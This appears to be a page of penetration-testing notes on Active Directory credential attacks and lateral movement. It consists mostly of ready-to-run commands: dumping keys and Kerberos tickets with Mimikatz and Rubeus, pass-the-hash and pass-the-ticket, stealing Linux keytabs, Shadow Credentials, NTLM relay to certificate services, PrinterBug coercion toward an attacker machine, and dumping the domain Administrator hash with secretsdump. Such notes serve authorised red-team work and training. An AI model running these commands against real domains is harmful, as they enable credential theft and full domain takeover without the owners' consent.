+++
title = "AD: Escalating and Pivoting"
+++

# Escalating and Pivoting

## Pass the Key (PtK) OverPass the Hash (OtH)

*Concept: Request a Kerberos Ticket (TGT) using an NTLM hash or AES Key, rather than using the NTLM protocol directly.*

### Preparation

```bash
# Extract AES Keys
.\mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
```

### Option A: Mimikatz (Process Injection)

```bash
# Spawns a process. Windows will implicitly request TGT using the injected key/hash when network resources are accessed.
# Can use /ntlm, /aes128, or /aes256
sekurlsa::pth /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY> /run:cmd.exe
```

### Option B: Rubeus (Request & Inject)

```bash
# Requests a TGT from the KDC and immediately injects it (/ptt)
# Can use /rc4 (NTLM), /aes128, or /aes256
.\Rubeus.exe asktgt /ptt /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY>
```

## Pass the Ticket (PtT)

### Windows

**Mimikatz**
```bash
# 1. Export tickets from memory to .kirbi files
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
# $ : machine tickets (computers)
# @ : service tickets (users)

# 2. Inject Ticket
.\mimikatz.exe "kerberos::ptt <TICKET_FILE.kirbi>" "misc::cmd" exit
```

**Rubeus**
```bash
# Enumerate tickets currently in session
.\Rubeus.exe triage

# Export tickets to base64 (for copy-paste)
.\Rubeus.exe dump /nowrap

# Pass from File
.\Rubeus.exe ptt /ticket:"<TICKET_FILE.kirbi>"

# Pass from Base64 String
.\Rubeus.exe ptt /ticket:"<BASE64_STRING>"

# Convert File to Base64 (PowerShell Helper)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<TICKET_FILE.kirbi>"))

# Advanced: Extract & Pass John's ticket automatically (Regex One-Liner)
$raw = .\Rubeus.exe dump /user:john /nowrap | Out-String
$ticket = [Regex]::Match($raw, "(?s)Base64EncodedTicket\s*:\s*(.*)").Groups[1].Value.Trim() -replace "\s", ""
.\Rubeus.exe ptt /ticket:$ticket
```

### Linux

- Cache: https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
    - Check `$KRB5CCNAME`
        - Stored in `/tmp`
- Keytabs: https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro
    - Machine: `/etc/krb5.keytab`

```bash
klist
# Backup current keytab
cp -v $(echo $KRB5CCNAME | cut -d ':' -f 2) KEYTAB.BAK
# Use current keytab
export KRB5CCNAME=KEYTAB.BAK
```

```bash
# Enumerate AD information
# https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd
realm list

# Check for AD
grep -i "sss\|winbind\|ldap" /etc/nsswitch.conf
ps -ef | grep -i "winbind\|sssd"
env | grep -i krb5

# Find keytabs
sudo find / \( -iname '*keytab*' -o -iname '*.kt' \) -ls 2>/dev/null

# List cached Kerberos tickets
klist
# Backup current keytab
cp -v $(echo $KRB5CCNAME | cut -d ':' -f 2) current.kt.bak
# Use current keytab
export KRB5CCNAME=$(pwd)/current.kt.bak

# Extract hashes from keytab files
# https://github.com/sosdave/KeyTabExtract
python3 keytabextract.py <KEYTAB_FILE>

# Use keytab
# NOTE: not all cached keytabs are valid
ls -la /tmp/krb5cc*
cp -v <KEYTAB> $HOME/current.kt.bak
export KRB5CCNAME=$HOME/current.kt.bak

# Show keytabs
klist
# Use keytab
kinit -k '<NAME>'

smbclient //<TARGET>/C$ -k -no-pass -c 'ls'
```

## Double Hop Problem

There's an issue known as the "Double Hop" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific resources. **Kerberos tickets should not be viewed as passwords**. They are signed pieces of data from the KDC that state what resources an account can access (e.g. a computer but not beyond that computer). When we perform Kerberos authentication, we get a "ticket" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.

### Enumeration of the Problem

Use these commands to confirm you are in a "Double Hop" / Network Logon state where delegation is failing.

| Command | Output Indicator | Meaning |
| :------ | :--------------- | :------ |
| `klist` | Missing `krbtgt/DOMAIN` | You have no TGT. You cannot request tickets for other servers. |
| `klist` | Present `HTTP/Hostname` | You only have a service ticket for the current box. |
| `mimikatz` | `Password : (null)` | LSASS has no cached credentials for your session. |
| `dir \\DC01\C$` | `Access is denied` / `Anonymous Logon` | The target sees you as "Anonymous" because no creds were forwarded. |

### Mitigation Methods

#### Rubeus / Overpass-the-Hash

Best if you have a Hash or AES Key. Injects a TGT into your current session, "fixing" the double hop instantly.

```powershell
# 1. Inject a TGT using the hash (or AES key)
.\Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt

# 2. Verify
klist # You now have a krbtgt ticket

# 3. Pivot
ls \\<DC_NAME>\C$ # Works natively now
```

#### Pass Credential Object

Best for "Living off the Land" without uploading tools. Requires knowing the plaintext password.

```powershell
# 1. Create the Credential Object
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $pass)

# 2. Execute command on the 2nd Hop using the Credential
Invoke-Command -ComputerName <MACHINE_NAME> -Credential $cred -ScriptBlock { Get-Process }

# 3. Or enter an interactive session
Enter-PSSession -ComputerName <MACHINE_NAME> -Credential $cred
```

#### Register PSSession Configuration (Admin)

Requires Admin on the Jump Box. Sets up a permanent endpoint that auto-authenticates.

```powershell
# 1. Register the Session (On Jump Box)
Register-PSSessionConfiguration -Name "<SESSION_NAME>" -RunAsCredential "<DOMAIN>\<USER>" -Force

# 2. Connect to it (From Attack/Start Box)
Enter-PSSession -ComputerName <MACHINE_NAME> -ConfigurationName "<SESSION_NAME>"

# 3. Verify
klist # You should now see the krbtgt ticket
```

#### Mimikatz PtH

Mimikatz usually spawns a new window (which fails in WinRM). You must force it to run a command in the same console.

```powershell
# /run:powershell might hang WinRM depending on the shell stability.
# Use Rubeus (Method 3) if possible.
mimikatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:powershell" exit
```

## Pass the Certificate (PtC)

**Shadow Credentials Attack:**
```bash
# https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/
# https://github.com/ShutdownRepo/pywhisker.git
git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker && uv pip install -r requirements.txt

# Get Certificate for user
uv run python3 pywhisker.py --dc-ip <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --target <NEW_USER> --action add
# creates .pfx file of <NEW_USER> and PFX password
```

```bash
# Intercept web enrollment requests
# https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
# NOTE: use https://github.com/ly4k/Certipy to find other templates
uv tool install git+https://github.com/fortra/impacket.git
ntlmrelayx.py --adcs --smb2support --template KerberosAuthentication -t <WEB_ENROLL_SERVER>
# outputs *.pfx file

# Force arbitrary auth from <TARGET> to <ATTACKER> via printers
# e.g. DC => ATTACKER BOX
# https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
wget https://github.com/dirkjanm/krbrelayx/raw/refs/heads/master/printerbug.py
python3 printerbug.py <DOMAIN>/<USERNAME>:"<PASSWORD>"@<TARGET> <ATTACKER>

# PtC to get TGT
# https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools && uv pip install -r requirements.txt && uv pip install git+https://github.com/wbond/oscrypto.git

# OPTIONAL: -pfx-pass from pywhisker.py
uv run python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASS> -dc-ip <DC_IP> '<DOMAIN>/<USER>' <OUTPUT_TGT>
# gives <OUTPUT_TGT>

---

# Configure Kerberos
echo '<DC_IP> <DC_FQDN>' | sudo tee -a /etc/hosts
sudo cp -v /etc/krb5.conf /etc/krb5.conf.bak
echo '[libdefaults]
    default_realm = <DOMAIN>
    dns_lookup_kdc = false
[realms]
    <DOMAIN> = {
        kdc = <DC_FQDN>
    }
[domain_realm]
    .<DOMAIN_LOWER> = <DOMAIN_UPPER>
    <DOMAIN_LOWER> = <DOMAIN_UPPER>
' | sudo tee /etc/krb5.conf

export KRB5CCNAME=<OUTPUT_TGT>
klist
# Get NTLM hash of DC Administrator
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DOMAIN>/<DC_HOSTNAME>$'@<TARGET_FQDN>
# gives HASH

evil-winrm ... -H <HASH>
```
